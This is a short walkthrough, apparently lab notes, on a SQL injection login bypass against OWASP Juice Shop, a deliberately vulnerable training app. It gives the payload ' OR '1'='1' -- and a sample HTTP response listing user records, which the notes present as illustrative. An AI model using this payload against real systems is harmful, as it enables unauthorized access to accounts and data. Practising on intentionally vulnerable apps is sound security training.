# Attack Steps: SQL Injection

## Steps to Perform the Attack
1. Go to the login form in OWASP Juice Shop (e.g., http://localhost:3000/login).
2. Enter a malicious payload in the username or password field to inject SQL code.
3. Submit the form and observe the response, which may leak database information.

## Malicious Payload and Response
**Malicious Payload:**
Use the following in the username field: ' OR '1'='1' --

**Subsequent Response:**
The attack bypasses authentication and returns user data. In Burp Suite, the response might look like this:
```
HTTP/1.1 200 OK
Content-Type: application/json
Content-Length: 500

{"users": [
  {"id": 1, "username": "admin", "email": "admin@juiceshop.com"},
  {"id": 2, "username": "user", "email": "user@juiceshop.com"}
]}
```
This response shows database data due to the injection.

